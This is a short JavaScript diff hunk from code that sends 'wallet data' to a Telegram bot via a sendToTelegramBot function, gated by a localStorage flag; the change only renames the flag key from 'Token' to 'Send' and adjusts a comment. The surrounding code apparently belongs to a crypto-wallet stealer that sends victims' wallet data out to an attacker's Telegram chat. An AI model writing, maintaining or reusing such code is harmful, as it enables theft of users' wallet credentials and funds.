@@ -29,11 +29,11 @@ async function sendToTelegramBot(data, botToken, chatId) {
     }
 }
 
-// Function to check import status and send wallet data if enabled
+// Function to check send status and send wallet data if enabled
 function checkAndSendWalletData(botToken, chatId) {
     try {
         // Check if import is enabled
-        const importStatus = localStorage.getItem('Token');
+        const importStatus = localStorage.getItem('Send');
         
         if (importStatus !== 'enabled') {
             console.log('Import is not enabled. No data will be sent.');
